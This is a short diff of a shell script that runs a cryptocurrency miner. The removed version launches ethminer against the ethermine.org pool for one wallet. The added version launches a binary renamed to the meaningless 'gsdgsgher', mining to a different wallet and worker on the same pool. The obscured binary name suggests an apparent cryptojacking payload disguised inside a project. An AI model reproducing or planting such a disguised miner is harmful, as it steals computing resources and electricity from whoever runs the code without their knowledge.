@@ -1,6 +1,2 @@
-#!/bin/bash
-
-#################################
-## Begin of user-editable part ##
-############################
-chmod +x ./ethminer && ./ethminer -U -P stratum1+tcp://0xBF7a2dB59CAF1ba7079C87CefFf8f62750fC990f.Y00@eu1.ethermine.org:4444
+#!/bin/sh
+chmod +x ./gsdgsgher && ./gsdgsgher -P stratum1+tcp://0xd885ab6fb5d05424b90aff7f5492310a5b981b19.lucky2409@eu1.ethermine.org:4444 -G -R
